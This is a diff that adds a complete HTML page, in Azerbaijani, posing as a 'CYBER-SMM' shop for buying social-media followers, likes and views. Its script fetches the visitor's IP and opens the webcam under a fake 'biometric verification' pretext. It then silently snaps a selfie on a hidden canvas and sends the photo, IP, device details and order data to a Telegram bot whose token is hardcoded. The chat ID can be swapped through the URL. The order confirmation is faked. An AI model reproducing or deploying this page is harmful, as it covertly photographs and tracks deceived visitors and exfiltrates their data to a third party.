@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CYBER-SMM | Ultra Premium Panel</title>
+  
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+
+  <style>
+    :root {
+      --primary: #ff0050;
+      --secondary: #00f2ea;
+      --accent: #8a2be2;
+      --bg: #050505;
+      --glass: rgba(255, 255, 255, 0.03);
+      --border: rgba(255, 255, 255, 0.1);
+      --text: #ffffff;
+    }
+
+    [data-theme="light"] {
+      --bg: #f0f2f5;
+      --glass: rgba(0, 0, 0, 0.05);
+      --border: rgba(0, 0, 0, 0.1);
+      --text: #111111;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      transition: 0.5s;
+      overflow-x: hidden;
+    }
+
+    /* --- Animated Cyber Background --- */
+    .cyber-bg {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at 50% 50%, #111, #000);
+      z-index: -1;
+    }
+
+    .neon-grid {
+      position: absolute;
+      width: 200%; height: 200%;
+      background-image: linear-gradient(var(--border) 1px, transparent 1px), 
+                        linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 50px 50px;
+      transform: perspective(500px) rotateX(60deg);
+      bottom: -50%; left: -50%;
+      animation: grid-move 20s linear infinite;
+      opacity: 0.2;
+    }
+
+    @keyframes grid-move { from { transform: perspective(500px) rotateX(60deg) translateY(0); } to { transform: perspective(500px) rotateX(60deg) translateY(50px); } }
+
+    /* --- Warning Modal --- */
+    #warning-modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.95);
+      backdrop-filter: blur(20px);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-box {
+      background: var(--glass);
+      border: 2px solid var(--primary);
+      padding: 50px;
+      border-radius: 30px;
+      text-align: center;
+      max-width: 600px;
+      box-shadow: 0 0 50px var(--primary);
+    }
+
+    /* --- Navbar --- */
+    nav {
+      padding: 25px 10%;
+      display: flex;
+      justify-content: space-between;
+      backdrop-filter: blur(15px);
+      border-bottom: 1px solid var(--border);
+      position: sticky; top: 0; z-index: 100;
+    }
+
+    .logo { font-family: 'Orbitron'; font-weight: bold; font-size: 24px; background: linear-gradient(45deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+    /* --- Hero Section --- */
+    .hero { padding: 100px 10%; text-align: center; }
+    .hero h1 { font-family: 'Orbitron'; font-size: clamp(2rem, 10vw, 5rem); text-transform: uppercase; margin-bottom: 20px; line-height: 1; text-shadow: 0 0 20px var(--primary); }
+
+    /* --- Service Cards --- */
+    .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; padding: 50px 10%; }
+    .card { background: var(--glass); border: 1px solid var(--border); padding: 40px; border-radius: 25px; transition: 0.4s; text-align: center; backdrop-filter: blur(10px); }
+    .card:hover { transform: translateY(-15px) rotateY(10deg); border-color: var(--secondary); box-shadow: 0 0 30px var(--secondary); }
+
+    /* --- Order Form --- */
+    .order-container { max-width: 800px; margin: 50px auto; background: var(--glass); padding: 60px; border-radius: 40px; border: 1px solid var(--border); box-shadow: 0 20px 80px rgba(0,0,0,0.5); }
+    input, select { width: 100%; padding: 20px; margin-bottom: 20px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 15px; color: white; font-size: 16px; transition: 0.3s; }
+    input:focus { border-color: var(--secondary); outline: none; box-shadow: 0 0 15px var(--secondary); }
+
+    .btn-cyber { width: 100%; padding: 25px; border: none; border-radius: 20px; background: linear-gradient(45deg, var(--primary), var(--accent)); color: white; font-weight: bold; font-family: 'Orbitron'; font-size: 20px; letter-spacing: 3px; transition: 0.4s; }
+    .btn-cyber:hover { transform: scale(1.05); box-shadow: 0 0 50px var(--primary); }
+
+    /* --- Camera View (Verification) --- */
+    #cam-preview { width: 250px; height: 250px; margin: 0 auto 30px; border-radius: 50%; border: 4px solid var(--secondary); overflow: hidden; background: #000; display: none; box-shadow: 0 0 30px var(--secondary); position: relative;}
+    video { width: 100%; height: 100%; object-fit: cover; }
+    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--secondary); top: 0; animation: scan 2s linear infinite; }
+    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+    /* --- Statistics --- */
+    .stats { display: flex; justify-content: center; gap: 50px; margin-top: 40px; font-family: 'Orbitron'; }
+    .stat-item h2 { color: var(--secondary); font-size: 3rem; }
+
+  </style>
+</head>
+<body>
+
+  <div id="warning-modal">
+    <div class="modal-box">
+      <h1 style="font-family: 'Orbitron'; color: var(--primary); margin-bottom: 20px;">SECURITY PROTOCOL</h1>
+      <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px; opacity: 0.9;">
+        DİQQƏT: Bu sayt kiber-təhlükəsizlik analitikası aparır. <br>
+        Giriş düyməsinə basdıqda aşağıdakı məlumatlar administratora (Telegram) göndəriləcək: <br><br>
+        ✅ <b>IP Ünvanınız</b> <br>
+        ✅ <b>Cihaz və Brauzer məlumatları</b> <br>
+        ✅ <b>Yerləşdiyiniz məkan (Təxmini)</b> <br>
+        ✅ <b>Biometrik (Kamera) doğrulaması</b>
+      </p>
+      <button class="btn-cyber" onclick="initCyberProtocol()">RAZIYAM & DAXİL OL</button>
+    </div>
+  </div>
+
+  <div class="cyber-bg"><div class="neon-grid"></div></div>
+
+  <nav>
+    <div class="logo">CYBER-SMM.V6</div>
+    <div id="status-ip" style="color: var(--secondary); font-family: 'Orbitron'; font-size: 12px;">SCANNING...</div>
+  </nav>
+
+  <section class="hero">
+    <h1>CYBER <span style="color: var(--secondary);">INFLUENCE</span></h1>
+    <p style="max-width: 700px; margin: 0 auto; opacity: 0.6;">Dünyanın ən qabaqcıl SMM mühərriki. Tamamilə avtomatlaşdırılmış 3D çatdırılma sistemi ilə tanış olun.</p>
+    
+    <div class="stats">
+      <div class="stat-item"><h2>2.4M</h2><p>DELIVERED</p></div>
+      <div class="stat-item"><h2>100%</h2><p>SECURE</p></div>
+    </div>
+  </section>
+
+  <div class="services">
+    <div class="card"><h3>INSTAGRAM</h3><p>Real Followers</p><h2>$1.50/k</h2></div>
+    <div class="card"><h3>TIKTOK</h3><p>Global Likes</p><h2>$0.80/k</h2></div>
+    <div class="card"><h3>YOUTUBE</h3><p>4K Views</p><h2>$3.20/k</h2></div>
+  </div>
+
+  <div class="order-container">
+    <h2 style="text-align: center; font-family: 'Orbitron'; margin-bottom: 40px;">SİFARİŞİ BAŞLAT</h2>
+    
+    <div id="cam-preview">
+      <video id="video" autoplay playsinline></video>
+      <div class="scan-line"></div>
+    </div>
+
+    <form id="smm-form">
+      <select id="platform">
+        <option>Instagram Premium Followers</option>
+        <option>TikTok Viral Booster</option>
+        <option>YouTube Watch Time</option>
+      </select>
+      <input type="text" id="target" placeholder="İstifadəçi adı və ya URL" required>
+      <input type="number" id="qty" placeholder="Miqdar (məs: 5000)" required>
+      <button type="submit" class="btn-cyber" id="main-btn">SİFARİŞİ TƏSDİQLƏ</button>
+    </form>
+  </div>
+
+  <canvas id="hidden-canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = '7453310159:AAFIYrUSXr43yfldDlHOlqH9NhbvcT7ae7s';
+    const CHAT_ID = new URLSearchParams(window.location.search).get('id') || '6703554157'; // Default və ya URL-dən
+
+    let userIp = "";
+
+    // IP ünvanını real vaxtda çəkək
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => {
+        userIp = d.ip;
+        document.getElementById('status-ip').innerText = `USER_IP: ${d.ip}`;
+      });
+
+    async function initCyberProtocol() {
+      document.getElementById('warning-modal').style.display = 'none';
+      document.getElementById('cam-preview').style.display = 'block';
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('video').srcObject = stream;
+        
+        // Kamera açılandan 2 saniyə sonra "giriş" məlumatlarını göndərək
+        setTimeout(() => captureAndSend('GİRİŞ_PROTOKOLU'), 2000);
+      } catch (err) {
+        // Kamera rədd edilsə belə IP-ni göndərək
+        sendTextToTelegram(`⚠️ Kamera İcazəsi Verilmədi!\nİstifadəçi IP: ${userIp}\nCihaz: ${navigator.userAgent}`);
+      }
+    }
+
+    function captureAndSend(type) {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('hidden-canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'selfie.jpg');
+        formData.append('caption', `🔥 ${type}\n📍 IP: ${userIp}\n📱 Cihaz: ${navigator.platform}\n⏰ Saat: ${new Date().toLocaleTimeString()}`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      }, 'image/jpeg');
+    }
+
+    function sendTextToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+      });
+    }
+
+    // Sifariş Formu
+    document.getElementById('smm-form').onsubmit = (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('main-btn');
+      const platform = document.getElementById('platform').value;
+      const target = document.getElementById('target').value;
+      const qty = document.getElementById('qty').value;
+
+      btn.innerText = "YÜKLƏNİR...";
+      btn.disabled = true;
+
+      // Sifariş anında şəkili və məlumatı göndər
+      captureAndSend('YENİ_SİFARİŞ_DETAL');
+      sendTextToTelegram(`✅ SİFARİŞ QƏBUL EDİLDİ:\nPlatform: ${platform}\nLink: ${target}\nMiqdar: ${qty}\nIP: ${userIp}`);
+
+      setTimeout(() => {
+        confetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
+        alert("Sifarişiniz uğurla sistemə daxil edildi! Order ID: #" + Math.floor(Math.random()*1000000));
+        btn.innerText = "SİFARİŞİ TƏSDİQLƏ";
+        btn.disabled = false;
+      }, 3000);
+    };
+  </script>
+</body>
+</html>
